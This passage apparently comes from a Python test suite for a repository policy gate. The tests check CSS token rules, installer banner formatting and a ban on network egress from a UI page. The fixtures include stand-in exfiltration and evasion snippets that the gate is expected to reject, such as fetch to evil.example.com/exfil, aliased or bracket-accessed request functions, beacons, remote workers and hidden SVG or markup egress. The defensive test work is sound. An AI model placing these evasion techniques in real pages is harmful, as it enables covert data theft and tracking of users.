        self.assertIn("THEME-SYNC", r.stdout)
        self.assertIn("theme-override.css", r.stdout)

    def test_a_second_stylesheet_without_tokens_is_fine(self) -> None:
        """Layout-only stylesheets are normal and must stay allowed."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/layout.css", ".grid { display: grid; gap: 16px; }\n")
        r = fx.run()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_second_stylesheet_scan_is_not_case_sensitive(self) -> None:
        """rglob("*.css") is case-insensitive on Windows and case-sensitive on
        Linux, so theme.CSS would be checked on the machine this was written
        on and invisible on the runner that actually gates the merge."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/override.CSS", ":root { --mg-ink: #FFFFFF; }\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)

    def test_token_smuggled_into_an_at_rule_in_a_second_file_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/override.css",
                 "@media (min-width: 1px) { :root { --mg-ink: #FFFFFF; } }\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)

    def test_at_scope_in_tokens_is_rejected(self) -> None:
        """@scope is @layer's twin for this purpose: it adds scoping proximity
        as a tie-breaker that runs BEFORE source order, so it too can change
        the winner without changing which declaration comes last.

        @media and @container are deliberately NOT rejected — they change
        which rules match, not which of two matching declarations wins."""
        css = self.tokens() + "\n@scope (:root) { :root { --mg-ink: #FFFFFF; } }\n"
        r = self.with_tokens(css)
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)

    def test_prose_about_at_layer_does_not_trip_the_rule(self) -> None:
        css = self.tokens().replace(
            ":root {", "/* Tokens are declared outside any @layer or @scope. */\n:root {", 1)
        r = self.with_tokens(css)
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_at_layer_check_is_case_insensitive(self) -> None:
        """CSS at-rule keywords are case-insensitive; the check was not. A
        plain @LAYER reopened the round-2 cascade bypass completely."""
        for keyword in ("@LAYER", "@Layer", "@SCOPE"):
            with self.subTest(keyword=keyword):
                css = self.tokens() + (
                    f"\n{keyword} overrides {{\n"
                    '  :root[data-theme="dark"] { --mg-ink-faint: #7C8C94; }\n}\n')
                r = self.with_tokens(css)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("THEME-SYNC", r.stdout)

    def test_at_layer_in_tokens_is_rejected(self) -> None:
        """@layer decides winners independently of source order — an unlayered
        rule beats a layered one wherever each sits. parse_css_tokens resolves
        duplicates by source order, so with a layer present it measures a
        value the browser never renders. It must refuse to guess."""
        css = self.tokens() + (
            "\n@layer overrides {\n"
            '  :root[data-theme="dark"] { --mg-ink-faint: #7C8C94; }\n'
            "}\n")
        r = self.with_tokens(css)
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("THEME-SYNC", r.stdout)
        self.assertIn("@layer", r.stdout)

    def test_indirection_that_hides_a_call_site_is_rejected(self) -> None:
        """Round 2's point: matching `fetch(` is useless if the author can
        reach the same function under another name. The primitives that make
        a call site unreadable are the violation, whatever follows them."""
        for label, body in (
                ("alias fetch",
                 '<script>const f = fetch; f("ht" + "tps://evil.example/x");</script>'),
                ("bracket access on a global",
                 '<script>const m = navigator["sendBeacon"]; m.call(navigator, u, d);</script>'),
                ("image beacon",
                 '<script>const i = new Image(); i.src = "ht" + "tps://evil/x.png";</script>'),
                ("worker loads remote code",
                 '<script>new Worker("ht" + "tps://evil.example/w.js");</script>'),
                ("service worker",
                 '<script>navigator.serviceWorker.register("/sw.js");</script>'),
                ("runtime code construction",
                 '<script>new Function("return " + payload)();</script>')):
            with self.subTest(technique=label):
                r = self.page(body)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_markup_level_egress_channels_are_rejected(self) -> None:
        """None of these involve fetch at all. They are the ways a page
        reaches the network without any script the fetch rule would see."""
        for label, body in (
                ("iframe", '<iframe src="https://evil.example.com/x"></iframe>'),
                ("meta refresh",
                 '<meta http-equiv="refresh" content="0;url=https://evil.example.com/">'),
                ("css url() in an inline style",
                 '<div style="background:url(https://evil.example.com/x.png)"></div>'),
                ("@import a remote stylesheet",
                 '<style>@import url("https://evil.example.com/x.css");</style>'),
                ("form action off-host",
                 '<form action="https://evil.example.com/x" method="post"></form>')):
            with self.subTest(channel=label):
                r = self.page(body)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_destructuring_a_request_primitive_is_rejected(self) -> None:
        r = self.page('<script>const {fetch: f} = window; f("/v1/x");</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_comment_scanner_survives_awkward_javascript(self) -> None:
        """blank_line_comments tracks quote state by hand, so the constructs
        that break naive scanners get pinned: an apostrophe inside a template
        literal or a regex would otherwise flip it into 'inside a string' for
        the rest of the file and silently stop checking anything after."""
        for label, body in (
                ("template literal with an apostrophe",
                 "<script>const s = `it's fine`; fetch(\"/v1/x\");</script>"),
                ("regex literal with an apostrophe",
                 "<script>const r = /can't/; fetch(\"/v1/x\");</script>"),
                ("apostrophe in HTML text",
                 "<p>the operator's console</p><script>fetch(\"/v1/x\");</script>"),
                ("CRLF line endings",
                 '<script>\r\n  // a comment\r\n  fetch("/v1/x");\r\n</script>\r\n')):
            with self.subTest(construct=label):
                r = self.page(body)
                self.assertEqual(r.returncode, 0, r.stdout)

    def test_violations_after_awkward_javascript_are_still_caught(self) -> None:
        """The other half of the previous test, and the one that would fail
        silently: if the scanner got stuck 'inside a string', everything after
        the awkward construct would stop being checked and the suite would
        still be green."""
        r = self.page("<script>const s = `it's fine`;</script>"
                      "<style>.x { color: #8B9AA0; }</style>")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("colour literal", r.stdout)

        r = self.page('<script>\r\n  // note\r\n'
                      '  fetch("https://evil.example.com/x");\r\n</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("evil.example.com", r.stdout)

    def test_a_regex_literal_does_not_disable_the_scanner(self) -> None:
        """The nastiest defect found in three rounds, because it needs no
        adversarial intent at all. `const t = /a\\//;` — an ordinary regex
        matching a trailing slash — used to read as a `//` comment opener, so
        everything after it on that line was blanked and stopped being
        checked. Any regex matching a slash or a URL path segment was a
        landmine that quietly switched both halves of the rule off."""
        r = self.page('<script>const t = /a\\//; const bad = "#8B9AA0";</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("colour literal", r.stdout)

        r = self.page('<script>const u = /path\\/seg/;</script>'
                      '<script>fetch("https://evil.example.com/x");</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("evil.example.com", r.stdout)

    def test_ordinary_regexes_and_division_still_pass(self) -> None:
        """The other direction. The regex heuristic is deliberately biased
        toward NOT blanking when it cannot decide: an unblanked comment is at
        worst a loud false positive, while an over-eager blank silently
        switches the rules off — which is the failure that already happened."""
        for label, body in (
                ("regex matching a slash",
                 '<script>const r = /a\\//; fetch("/v1/x");</script>'),
                ("division",
                 '<script>const mean = total / count; fetch("/v1/x");</script>'),
                ("html closing tags",
                 '<div><span>x</span></div><script>fetch("/v1/x");</script>'),
                ("regex character class containing a slash",
                 '<script>const r = /[/]/; fetch("/v1/x");</script>')):
            with self.subTest(construct=label):
                r = self.page(body)
                self.assertEqual(r.returncode, 0, r.stdout)

    def test_unquoted_attribute_urls_are_caught(self) -> None:
        """HTML attribute values may be unquoted, so no string state protects
        them from the comment scanner. Both of these were silently blanked and
        then missed — the protocol-relative one twice over, because that
        pattern also required quotes.

        Found by mutation testing: removing the ':' guard from the scanner
        left the whole suite green, which meant nothing pinned the behaviour
        the guard exists for."""
        for label, body in (
                ("unquoted https", '<img src=https://evil.example.com/x.png>'),
                ("unquoted href", '<a href=https://evil.example.com/>x</a>'),
                ("unquoted protocol-relative", '<img src=//evil.example.com/x.png>'),
                ("unquoted form action", '<form action=//evil.example.com/x></form>')):
            with self.subTest(case=label):
                r = self.page(body)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_comment_scanner_unit_behaviour(self) -> None:
        """Direct unit tests of blank_line_comments.

        Honest note on coverage, because the alternative is a false
        impression: mutation testing showed the regex character-class branch
        can be deleted with this whole suite staying green, and no input was
        found that discriminates it (a slash inside [...] that prematurely
        ends the literal is immediately followed by another `/` that re-opens
        one, so the blanking nets out the same). The assertions below are
        correct statements of intended behaviour, but the character-class ones
        would pass without that branch. It is kept for correctness of the
        model, not because a test forces it — and that is written down in the
        function itself too."""
        sys.path.insert(0, str(GATE.parent))
        try:
            import policy_check as pc
        finally:
            sys.path.pop(0)

        blank = lambda s: pc.blank_line_comments(s)

        # A real comment goes away.
        self.assertNotIn("secret", blank("const a = 1; // secret\n"))
        # A URL inside a string does not.
        self.assertIn("evil.example", blank('fetch("https://evil.example/x");\n'))
        # A scheme separator outside a string does not.
        self.assertIn("evil.example", blank("<img src=https://evil.example/x>\n"))
        # An unquoted protocol-relative attribute does not.
        self.assertIn("evil.example", blank("<img src=//evil.example/x>\n"))
        # A regex containing a slash does not swallow what follows it.
        self.assertIn("#8B9AA0", blank('const r = /a\\//; const b = "#8B9AA0";\n'))
        # ...including when the slash is inside a character class.
        self.assertIn("#8B9AA0", blank('const r = /[a/]/; const b = "#8B9AA0";\n'))
        self.assertIn("#8B9AA0", blank('const r = /[//]/; const b = "#8B9AA0";\n'))
        # A regex does not run past the end of its line.
        self.assertIn("#8B9AA0", blank('const r = /unterminated\nconst b = "#8B9AA0";\n'))
        # Line count is preserved, so reported line numbers stay correct.
        source = 'a\n// b\nc\n'
        self.assertEqual(blank(source).count("\n"), source.count("\n"))

    def test_runtime_token_assignment_is_rejected(self) -> None:
        """The "colour tokens live in exactly one file" guarantee is static.
        Writing a --mg-* property at runtime steps around it with no literal
        for the colour checks to see."""
        r = self.page('<script>document.documentElement.style'
                      '.setProperty("--mg-ink-faint", computed);</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_form_action_and_submit_are_rejected(self) -> None:
        r = self.page('<script>const f = document.createElement("form");'
                      'f.action = "ht" + "tps://evil.example/x"; f.submit();</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_bracket_access_on_a_browsing_context_is_rejected(self) -> None:
        """top["fetch"](...) reached the same function with none of the literal
        text any other pattern looks for."""
        for global_name in ("top", "parent", "frames"):
            with self.subTest(global_name=global_name):
                r = self.page(f'<script>{global_name}["fetch"]("/x");</script>')
                self.assertEqual(r.returncode, 1, r.stdout)

    def test_colour_literal_is_caught_despite_an_unrelated_line_comment(self) -> None:
        """Pins the // exclusion as line-scoped. Replacing the whole exclusion
        with a file-wide `if "//" in source: continue` left the entire suite
        green, because no existing fixture happened to contain a `//` -- while
        the real ui/shield/index.html contains them throughout. That mutation
        would have silently disabled colour checking on the one file that
        matters."""
        r = self.page("<script>\n"
                      "  const NS = 'http://www.w3.org/2000/svg'; // a comment\n"
                      "</script>\n"
                      "<style>.x { color: #8B9AA0; }</style>\n")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("colour literal", r.stdout)

    def test_prose_in_a_line_comment_does_not_trip_the_rule(self) -> None:
        """The other direction, and the trap this project has now hit twice:
        a note explaining why a CDN reference was removed must not itself be
        a build failure."""
        r = self.page("<script>\n"
                      '  // we used to fetch("https://old-cdn.example/x") here; removed\n'
                      "  // the accent was #8B9AA0 before it was re-stepped\n"
                      '  fetch("/v1/overview");\n'
                      "</script>\n")
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_a_url_inside_a_string_survives_comment_blanking(self) -> None:
        """...and blanking line comments must not eat the second half of a
        string literal, which is what made the naive fix unacceptable."""
        r = self.page('<script>fetch("https://evil.example.com/x");</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("evil.example.com", r.stdout)

    def test_a_package_tree_under_ui_is_not_skipped_by_name(self) -> None:
        """Skipping a directory because of its NAME meant an ordinary
        <script src="node_modules/evil.js"> was never opened."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/index.html", '<script src="node_modules/evil.js"></script>')
        fx.write("ui/shield/node_modules/evil.js",
                 'fetch("https://evil.example.com/exfil");\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_python_dependency_manifests_are_known_to_the_licence_rule(self) -> None:
        """Python was the one ecosystem actually in use here and the one the
        rule could not see."""
        for name in ("requirements.txt", "pyproject.toml", "Pipfile", "setup.py"):
            with self.subTest(manifest=name):
                fx = self.fixture()
                fx.write(f"tools/{name}", "jsonschema==4.26.0\n")
                r = fx.run()
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("LICENCE", r.stdout)
                self.assertIn("no scanner", r.stdout)

    def test_svg_assets_are_scanned(self) -> None:
        """An SVG is a document, not an image: it can carry <image href> to a
        remote host, its own <style> and <script>, and raw fill="#…". Leaving
        .svg out of the scanned set was a clean bypass of both halves of this
        rule -- pull it in with <link rel="icon"> and neither the egress check
        nor the colour check ever looked at it."""
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/index.html", '<link rel="icon" href="logo.svg">')
        fx.write("ui/shield/logo.svg",
                 '<svg xmlns="http://www.w3.org/2000/svg">\n'
                 '  <image href="https://evil.example.com/track.png" />\n'
                 '  <rect fill="#8B9AA0" />\n'
                 '</svg>\n')
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)
        self.assertIn("evil.example.com", r.stdout)
        self.assertIn("colour literal", r.stdout)

    def test_svg_namespace_declaration_does_not_trip_the_svg_scan(self) -> None:
        fx = self.fixture()
        fx.write("ui/tokens.css", self.tokens())
        fx.write("ui/shield/logo.svg",
                 '<svg xmlns="http://www.w3.org/2000/svg">'
                 '<rect fill="currentColor" /></svg>\n')
        r = fx.run()
        self.assertEqual(r.returncode, 0, r.stdout)

    def test_url_hidden_after_a_js_line_comment_marker_is_still_seen(self) -> None:
        """Stripping // comments would eat the second half of a "https://..."
        string literal and blind the rule to the exact thing it looks for."""
        r = self.page('<script>fetch("https://cdn.example.com/x.json");</script>')
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("UI-SELF-CONTAINED", r.stdout)

    def test_scanning_survives_the_whole_real_page(self) -> None:
        """The scenario that keeps this rule honest, checked against the file
        that actually ships.

        blank_line_comments is hand-written state-machine code. If it wrongly
        enters string or regex state anywhere inside ui/shield/index.html,
        every check after that point silently stops and the gate still reports
        PASS — the exact failure this whole rule exists to prevent, hiding
        inside the tool meant to prevent it.

        So: inject a known violation after every line of the real page and
        assert it survives the comment blanking. Lines that are genuinely
        inside a /* */ or <!-- --> comment are skipped, because ignoring those
        is correct. Run in-process rather than through the gate, so probing a
        thousand lines costs milliseconds instead of a thousand subprocesses.
        """
        page = GATE.parent.parent / "ui" / "shield" / "index.html"
        if not page.is_file():
            self.skipTest("no shipped page to probe")

        sys.path.insert(0, str(GATE.parent))
        try:
            import policy_check
        finally:
            sys.path.pop(0)

        lines = page.read_text(encoding="utf-8").split("\n")
        violation = "<style>.zz{color:#8B9AA0}</style>"
        blind: list[int] = []

        for idx in range(len(lines)):
            mutated = "\n".join(lines[:idx + 1] + [violation] + lines[idx + 1:])
            after_block = policy_check.blank_block_comments(mutated)
            if after_block.split("\n")[idx + 1].strip() == "":
                continue   # landed inside a real comment; correct to ignore
            after_line = policy_check.blank_line_comments(after_block)
            if "#8B9AA0" not in after_line.split("\n")[idx + 1]:
                blind.append(idx + 1)

        self.assertEqual(blind, [],
                         f"comment blanking swallows real code after line(s) {blind[:10]} "
                         f"of the shipped page — every check after that point is silently "
                         f"disabled")

    # -- INSTALLER-ASSETS --------------------------------------------------

    WIDE = ("=" * 40 + "\n"
            "  #     # ####### #######\n"
            "  ##   ## #       #\n"
            "  #     # ####### #######\n"
            + "=" * 40 + "\n"
            "  SWITCH . BILLING . SHIELDS UP\n")
    NARROW = ("=" * 20 + "\n"
              " __  __ ___\n"
              "|  \\/  | __|\n"
              + "=" * 20 + "\n")

    def banners(self, wide=None, narrow=None):
        fx = self.fixture()
        fx.write("install/banner-wide.txt", self.WIDE if wide is None else wide)
        fx.write("install/banner-narrow.txt", self.NARROW if narrow is None else narrow)
        return fx.run()

    def test_valid_banners_pass(self) -> None:
        r = self.banners()
        self.assertEqual(r.returncode, 0, r.stdout)
        self.assertIn("installer banner", r.stdout)

    def test_non_ascii_banner_is_rejected(self) -> None:
        """The reason this rule exists. The masthead renders on a fresh Debian
        box over SSH with LANG=C, on a provider's serial console, and in a
        rescue shell. Box-drawing characters and smart quotes arrive as
        mojibake, which says 'never run on a real server' before the operator
        has read a word. One paste out of a word processor does it."""
        for label, text in (
                ("box drawing", "╔" + "═" * 20 + "╗\n MEGATRON\n"),
                ("em dash", "=" * 20 + "\n MEGATRON — the switch\n"),
                ("smart quote", "=" * 20 + "\n MEGATRON’s console\n")):
            with self.subTest(case=label):
                r = self.banners(wide=text)
                self.assertEqual(r.returncode, 1, r.stdout)
                self.assertIn("INSTALLER-ASSETS", r.stdout)

    def test_overwide_banner_is_rejected(self) -> None:
        """A wrapped banner looks worse than no banner."""
        r = self.banners(wide="#" * 90 + "\n MEGATRON\n")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("INSTALLER-ASSETS", r.stdout)
        self.assertIn("80-column", r.stdout)

    def test_tabs_in_a_banner_are_rejected(self) -> None:
        """Tab stops differ between terminals, so the art shears."""
        r = self.banners(wide="=" * 20 + "\n#\tMEGATRON\n")
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("INSTALLER-ASSETS", r.stdout)

    def test_missing_width_variant_is_rejected(self) -> None:
        fx = self.fixture()
        fx.write("install/banner-wide.txt", self.WIDE)
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("banner-narrow.txt", r.stdout)

    def test_narrow_banner_must_actually_be_narrower(self) -> None:
        """Otherwise choosing between them does nothing, and the narrow
        terminal this exists for still gets a wrapped masthead."""
        r = self.banners(narrow=self.WIDE)
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("INSTALLER-ASSETS", r.stdout)

    def test_install_dir_without_a_banner_is_rejected(self) -> None:
        """A renamed or moved banner must not turn this rule into a no-op that
        keeps reporting success."""
        fx = self.fixture()
        fx.write("install/answers.example.yml", "version: '0.1.0'\n")
        r = fx.run()
        self.assertEqual(r.returncode, 1, r.stdout)
        self.assertIn("INSTALLER-ASSETS", r.stdout)

    # -- the CSS parser itself ---------------------------------------------

    def test_parser_ignores_declarations_inside_comments(self) -> None:
        sys.path.insert(0, str(GATE.parent))
        try:
            import policy_check
        finally:
            sys.path.pop(0)
        blocks = policy_check.parse_css_tokens(
            ":root {\n"
            "  /* --mg-ink: #BADBAD; a comment describing the token */\n"
            "  --mg-ink: #0F1719;\n"
            "}\n")
        self.assertEqual(blocks[":root"], {"--mg-ink": "#0F1719"})

    def test_parser_reads_the_inner_block_of_an_at_rule(self) -> None:
        sys.path.insert(0, str(GATE.parent))
        try:
            import policy_check
        finally:
            sys.path.pop(0)
        blocks = policy_check.parse_css_tokens(
            '@media (prefers-color-scheme: dark) {\n'
            '  :root:not([data-theme="light"]) { --mg-ink: #E6EDEF; }\n'
            '}\n')
        self.assertIn(':root:not([data-theme="light"])', blocks)
        self.assertEqual(blocks[':root:not([data-theme="light"])'],
                         {"--mg-ink": "#E6EDEF"})


if __name__ == "__main__":
    unittest.main(verbosity=2)
